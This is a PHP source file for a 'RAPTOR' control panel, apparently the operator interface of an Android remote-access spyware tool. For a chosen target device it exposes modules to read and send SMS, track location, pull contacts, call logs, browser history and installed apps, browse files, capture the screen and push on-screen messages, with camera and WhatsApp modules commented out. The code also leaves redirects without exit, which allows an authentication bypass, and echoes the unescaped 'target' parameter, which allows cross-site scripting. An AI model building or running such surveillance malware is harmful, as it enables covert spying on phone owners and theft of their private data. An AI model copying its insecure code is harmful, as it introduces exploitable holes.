<?php
require_once '../private/session_manager.php';

if(!isLogin()){
   header('Location: login.php');
}

if (!isset($_GET['target']) || !isset($_GET['type'])){
    header('Location: index.php');
}



?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="refresh" content="100" > <!-- her 100 saniyede 1 sayfayı yenile -->
    <title>RAPTOR</title>

    <link rel="stylesheet" type="text/css" href="./css/theme.css"/>
    <link rel="stylesheet" type="text/css" href="./css/toastify.css"/>
    <link rel="stylesheet" type="text/css" href="./css/leaflet.css"/>
    <link rel="stylesheet" type="text/css" href="./css/font-awesome.min.css"/>

    <script type="text/javascript" src="./js/toastify.js"></script>
    <script type="text/javascript" src="./js/jquery.js"></script>
    <script type="text/javascript" src="./js/leaflet.js"></script>
    <script type="text/javascript" src="./js/socket.io.js"></script>

    <style>
        .tall-row {
            margin-top: 40px;
        }
        .modal {
            position: relative;
            top: auto;
            right: auto;
            left: auto;
            bottom: auto;
            z-index: 1;
            display: block;
        }

    </style>
</head>

<body>

<nav class="navbar navbar-default navbar-static-top">
    <div class="container-fluid">
        <div class="row">
            <div class="col-lg-4 col-lg-offset-4">
                <a class="navbar-brand" href="index.php">RAPTOR Kontrol Paneli</a>
            </div>
        </div>
    </div>
</nav>


<div class="container-fluid">
    <div class="row">

        <div class="col-lg-2">
            <div class="list-group">
                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=1" class="list-group-item <?php if ($_GET['type']==1){ echo 'active';}?>">Specifications</a>
                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=2" class="list-group-item <?php if ($_GET['type']==2){ echo 'active';}?>">Location</a>
                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=3" class="list-group-item <?php if ($_GET['type']==3){ echo 'active';}?>"">Guide</a>
                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=4" class="list-group-item <?php if ($_GET['type']==4){ echo 'active';}?>">Send SMS</a>
                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=5" class="list-group-item <?php if ($_GET['type']==5){ echo 'active';}?>">Send SMS</a>
               <!-- <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=6" class="list-group-item <?php if ($_GET['type']==6){ echo 'active';}?>">Listening to media</a> -->
                <!--  <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=7" class="list-group-item <?php if ($_GET['type']==7){ echo 'active';}?>">Chat</a> -->
                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=8" class="list-group-item <?php if ($_GET['type']==8){ echo 'active';}?>">Toast</a>
                <!--  <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=9" class="list-group-item <?php if ($_GET['type']==9){ echo 'active';}?>">Screenshot</a> -->
                <!--  <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=10" class="list-group-item <?php if ($_GET['type']==10){ echo 'active';}?>">Camera</a> -->
                <!-- <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=11" class="list-group-item <?php if ($_GET['type']==11){ echo 'active';}?>">Scanner</a> -->
                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=12" class="list-group-item <?php if ($_GET['type']==12){ echo 'active';}?>">Searches</a>
                <!-- <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=13" class="list-group-item <?php if ($_GET['type']==13){ echo 'active';}?>">Call Voice Recordings</a> -->
                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=14" class="list-group-item <?php if ($_GET['type']==14){ echo 'active';}?>">Application</a>
                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=15" class="list-group-item <?php if ($_GET['type']==15){ echo 'active';}?>">Folders</a>
                <!-- <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=16" class="list-group-item <?php if ($_GET['type']==16){ echo 'active';}?>">Whattsap Mesajları</a> -->
                <!-- <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=17" class="list-group-item <?php if ($_GET['type']==17){ echo 'active';}?>">Kullanıcıya Ses Dinlettir</a> -->
                <!-- <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=18" class="list-group-item <?php if ($_GET['type']==18){ echo 'active';}?>">Numara Ara</a> -->
                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=19" class="list-group-item <?php if ($_GET['type']==19){ echo 'active';}?>">TTS</a>

                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=20" class="list-group-item">Exit</a>
            </div>
        </div>

        <div class="col-lg-10">

            <?php
            if ($_GET['type']==1){
                include './modules/device-property.php';
            } elseif ($_GET['type']==2){
                include './modules/location-tracker.php';
            } elseif ($_GET['type']==3){
                include './modules/rehber.php';
            } elseif ($_GET['type']==4){
                include './modules/read_all_sms.php';
            } elseif ($_GET['type']==5){
                include './modules/send-sms.php';
            } elseif ($_GET['type']==6){

            } elseif ($_GET['type']==7){

            } elseif ($_GET['type']==8){
                include './modules/screen-message.php';
            } elseif ($_GET['type']==9){

            } elseif ($_GET['type']==10){
                include './modules/screen-capture.php';
            } elseif ($_GET['type']==11){
                include './modules/browser_history.php';
            } elseif ($_GET['type']==12){
                include './modules/call_log_history.php';
            } elseif ($_GET['type']==13){

            } elseif ($_GET['type']==14){
                include './modules/app_list.php';
            } elseif ($_GET['type']==15){
                include './modules/file_manager.php';
            } elseif ($_GET['type']==16){

            } elseif ($_GET['type']==17){

            } elseif ($_GET['type']==18){

            } elseif ($_GET['type']==19){
                include './modules/text-speech.php';
            } elseif ($_GET['type']==20){
                logout();
                header('Location: login.php');
                ?>
                <script>
                    window.location.reload();
                </script>
                <?php
            } else {
                include './modules/telefon-detay.php';
            }

            ?>
        </div>


    </div>
    <div class="row tall-row">
        <div class="col-md-offset-8">
            <p>Created by <a href="#">Mehmet Şirin Sulan</a>. &copy; 2021</p>
        </div>
    </div>

</div>

</body>
</html>
